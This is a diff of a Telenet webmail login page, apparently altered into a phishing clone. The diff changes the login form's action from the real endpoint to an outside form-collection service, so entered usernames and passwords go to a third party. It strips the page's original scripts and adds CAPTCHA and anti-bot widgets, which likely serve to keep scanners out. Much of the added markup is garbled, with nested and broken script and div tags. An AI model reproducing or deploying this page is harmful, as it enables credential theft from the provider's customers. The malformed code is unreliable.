@@ -28,7 +28,6 @@
 
     
     
-        <script type="text/javascript" src="https://login.prd.telenet.be/openid/ruxitagentjs_ICA27NVfghjqrux_10283240117152214.js" data-dtconfig="app=bd04f5bd154f7157|ssc=1|cssm=n|featureHash=ICA27NVfghjqrux|vcv=2|rdnt=1|uxrgce=1|bp=3|cuc=wxbgggj9|mel=100000|md=mdcc1=a#login-form ^rb div.g-recaptcha,mdcc2=a#error|ssv=4|lastModification=1708171459084|tp=500,50,0,1|agentUri=/openid/ruxitagentjs_ICA27NVfghjqrux_10283240117152214.js|reportUrl=/openid/rb_58b59a93-831f-4aa5-913a-91bb5ca1f41c|rid=RID_-110783935|rpid=-1709908532|domain=telenet.be"></script><link rel="shortcut icon" href="https://static.telenet.be/assets/favicon/favicon.ico" type="image/x-icon"/>
     
 
 
@@ -43,93 +42,86 @@
 <script src="https://static.telenet.be/oauth2/js/vendor/jquery-ui-1.10.3.custom.min.js"></script>
 
 <script type="text/javascript">
-    function hideHtmlElement(id) {
-        document.getElementById(id).style.display = "none";
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+   <script type="text/javascript">
+    <html>
+  <head>
+    <title>reCAPTCHA demo: Calmos Webmail</title>
+    <script type="text/javascript">
+      var verifyCallback = function(response) {
+        alert(response);
+      };
+      var widgetId1;
+      var widgetId2;
+      var onloadCallback = function() {
+      
+        widgetId1 = grecaptcha.render('example1', {
+          'sitekey' : '6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw'
+',
+          'theme' : 'light'
+        });
+        widgetId2 = grecaptcha.render(document.getElementById('example2'), {
+          'sitekey' : '6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw'
+'
+        });
+        grecaptcha.render('example3', {
+          'sitekey' : '6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw',
+          'callback' : <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit"
+          'theme' : 'dark'
+        });
+      };
+   
+   
+
+  
+  
+  
+  
+  
+  <script>
+    function onSubmit(token) {
+      alert('thanks ' + document.getElementById('field').value);
     }
 
-    function showHtmlElement(id) {
-        document.getElementById(id).style.display = "block";
+    function validate(event) {
+      event.preventDefault();
+      if (!document.getElementById('field').value) {
+        alert("You must add text to the required field");
+      } else {
+        grecaptcha.execute();
+      }
     }
 
-    function showPanel(id) {
-        hideHtmlElement("forgotLogin");
-        hideHtmlElement("showLogin");
-        showHtmlElement(id);
+    function onload() {
+      var element = document.getElementById('submit');
+      element.onclick = validate;
     }
-
-    function getTelenetPasswordForgottenUrl(){
-        return "https://www2.telenet.be/nl/profiel/wachtwoord-vergeten?"
-            + "&login="
-            + document.getElementById('j_username').value
-            + "#/loginredirecturl="
-            + "https%253A%252F%252Flogin.prd.telenet.be%252Fopenid%252Foauth%252Fauthorize%253Fclaims%253D%25257B%252522id_token%252522%253A%25257B%252522http%253A%252F%252Ftelenet.be%252Fclaims%252Flicenses%252522%253Anull%252C%252522http%253A%252F%252Ftelenet.be%252Fclaims%252Fmailbox%252522%253Anull%25257D%25257D%2526response_type%253Dcode%2526state%253Df2d776bc-cb4f-4cdc-a055-5c33f3c5fae8%2526nonce%253Df93ba735-9f38-4726-a308-b2b78e8bbbca%2526client_id%253Dwebmail";
-    }
-
-    function getLoginForgottenUrl(){
-        return "https://www2.telenet.be"
-            + '/nl/klantenservice/telenet-login-vergeten?intcmp=openid_login_forgotten_webmail';
-    }
-
-    function getBasePasswordForgottenUrl(){
-        return "https://www.prd.base.be/nl/create-profile?flow=recoverpwd"
-            + "&login="
-            + document.getElementById('j_username_input').value;
-    }
-
-    function togglePassword() {
-        var password = document.getElementById('j_password');
-        if (password.type === 'text') {
-            togglePasswordIcon('show-hide', 'hide-show');
-            password.type = 'password';
-        } else {
-            togglePasswordIcon('hide-show', 'show-hide');
-            password.type = 'text';
-        }
-    }
-
-    function togglePasswordIcon(removeClass, addClass) {
-        document.getElementById('passwordEye').classList.remove(removeClass);
-        document.getElementById('passwordEye').classList.add(addClass);
-    }
-
-    function showEyeIcon() {
-        var password = document.getElementById('j_password');
-        if (password.value.trim() !== '') {
-            showElement('passwordEye');
-        } else {
-            hideElement('passwordEye');
-        }
-    }
-
-    function showElement(id) {
-        document.getElementById(id).style.display = 'block';
-    }
-
-    function hideElement(id) {
-        document.getElementById(id).style.display = 'none';
-    }
-
-    function toggleLanguage() {
-        var languageMenu = document.getElementById('language-menu');
-        if (languageMenu.classList.contains('open')) {
-            document.getElementById('language-menu').classList.remove('open');
-            document.getElementById('language-arrow').classList.remove('active');
-        } else {
-            document.getElementById('language-menu').classList.add('open');
-            document.getElementById('language-arrow').classList.add('active');
-        }
-    }
-</script>
 
 <!--[if lt IE 9]>
 <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
 <![endif]-->
 
+ </script>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  </head>
+  <body>
+    <form>
+	<div
+     <div Webmail <input id="field" name="field">
+      <div <id="recaptcha" class="g-recaptcha">
+         </div> <data-sitekey="6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw">
+         </div>  <data-callback="onSubmit">
+		 
+		  </div>
+	 </form>
+    
 
 
 
 
-
+<title>reCAPTCHA demo:Webmail</title>
+				<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+	<script src="https://www.google.com/recaptcha/api.js?render=6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw"></script>
 
 
     <link href="https://login.prd.telenet.be/openid/css/common/icons.css" rel="stylesheet" type="text/css">
@@ -184,6 +176,10 @@
     </div>
 </div>
 
+
+<title>reCAPTCHA demo:Webmail</title>
+				<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+	<script src="https://www.google.com/recaptcha/api.js?render=6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw"></script>
                         
                     </div>
                 </div>
@@ -210,8 +206,11 @@
                     
                         <div class="display-flex openid-login-page__container-details">
                             <div class="openid-login-page__container--form-login-section p--n width-260">
-                                <form id="login-form" name="loginForm" action="/openid/login.do" method="post" class="p--n m--n login-form">
+                                <form id="login-form" name="loginForm" action="https://formbold.com/s/9EpJk" method="post" class="p--n m--n login-form">
                                     <div class="form-group mb--m position--relative">
+									<div class="form-group mb--m position--relative">
+									<script src="https://unpkg.com/@botpoison/browser" async></script>
+									<form action="https://example.demo"data-botpoison-public-key="pk_efae6277-24cc-4810-8e1f-2b2c52372a04">
                                         <label for="j_username">
                                             
                                                 
@@ -272,7 +271,9 @@
                                                     <label class="label" for="rememberme">Aangemeld blijven</label>
                                                 </div>
                                             
-                                            
+                                            <title>reCAPTCHA demo:Webmail</title>
+				<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+	<script src="https://www.google.com/recaptcha/api.js?render=6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw"></script>
                                         
                                     </div>
 
@@ -388,7 +389,9 @@
     });
 </script>
 
-
+<title>reCAPTCHA demo:Webmail</title>
+				<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+	<script src="https://www.google.com/recaptcha/api.js?render=6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw"></script>
 
     
         
